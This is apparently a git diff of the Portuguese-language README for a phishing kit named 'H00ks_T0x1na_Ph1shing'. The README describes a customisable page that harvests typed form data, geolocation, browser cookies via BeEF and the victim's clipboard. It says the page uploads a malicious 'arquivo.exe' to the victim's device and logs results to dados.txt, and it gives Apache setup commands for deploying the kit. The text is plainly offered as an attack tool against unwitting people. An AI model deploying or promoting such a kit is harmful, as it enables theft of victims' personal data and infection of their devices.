@@ -7,23 +7,19 @@ Precisa de um servidor externo como na foto cloudflare mas podem ser outros como
 ![image](https://github.com/user-attachments/assets/2f8fbf71-55bf-4b95-93e2-cdd57d49754f)
 
 
-
-
 Necessita do php para coletar os dados....
-
 
 
 ![image](https://github.com/user-attachments/assets/90cd1590-dd47-4f30-af08-9e9e5ba9691f)
 
 
 
-
-
 Ferramenta completa de coleta de dados, desde informções do formulario que é personalizavel, tem coleta de localização, cookies do navegador (Não manipulavel, favor cofigurar corretamente no beef).... E personalizavel ao ponto de poder trocar a imagem de fundo
 
 
-Porem salve a imagem do fundo da pagina sempre como "1.jpg" e coloquem o arquivo malicioso como "arquivo.exe" ou troquem se quiserem o arquivo "arquivo.exe" no codigo da pagina
-![image](https://github.com/user-attachments/assets/1a344a19-07b0-49e2-affa-de85070b45bd)
+Porem salve a imagem do fundo da pagina sempre como "1.jpg" e coloquem o arquivo malicioso como "arquivo.exe" ou troque se prefirir o arquivo "arquivo.exe" no codigo da pagina
+![git-3](https://github.com/user-attachments/assets/fa8cc3ce-a99b-49c3-bf6a-b79bef5177d6)
+
 
 
 Volta as informaçoes em dados.txt... Localização (volta em longitude e a latitude (Localização: Lat: loc do alvo Long: loc do alvo)), se tem cookies no navegador, volta o formulario digitado, sobe uma carga maliciosa no dispositivo da vitima pelo navegador, e captura a clipboard da vitima .... ![git](https://github.com/user-attachments/assets/280c999c-68cd-499e-88e4-71345c77ea04)
@@ -57,7 +53,6 @@ Diretorios corretos:
 "sudo cp -r H00ks_T0x1na_Ph1shing/ /var/www/html"
 
 or
-
 
 Baixe e Inicie o Servidor Apache2:
 "sudo apt-get install apache2"
